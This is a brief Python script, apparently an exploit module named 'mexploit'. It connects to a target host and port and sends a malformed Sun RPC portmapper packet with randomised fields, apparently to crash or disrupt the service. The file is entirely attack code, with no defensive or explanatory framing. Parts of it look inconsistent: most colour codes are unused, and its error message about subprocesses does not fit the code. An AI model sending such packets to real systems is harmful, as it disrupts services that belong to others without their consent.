import socket
import random
import time

from struct import pack

def mexploit(target, port):
   red = "\033[31m"
   blue = "\033[34m"
   bold = "\033[1m"
   reset = "\033[0m"
   green = "\033[32m"
   yellow = "\033[33m"

   for i in range(1):
      pkt = pack(
         "!IIIIIIIIIII",
         0x80000030,  # fragment header
         random.randint(1, 2 ** 32 - 1),  # xid
         0,  # message type
         2,  # rpc version
         0x100000,  # program
         random.randint(1, 2 ** 32 - 1),  # program version
         0,  # procedure
         random.randint(1, 2 ** 32 - 1),  # credential flavor
         0,  # credential length
         0,  # verifier
         0,
      )
      try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(2)
         sock.connect((target, port))
         sock.send(pkt)
         sock.close()
         time.sleep(1)

      except Exception as err:
         print(err)
         print(f"{red}[FATAL_ERROR]{reset} Module failed to run any subprocess (0/3)")
         quit()

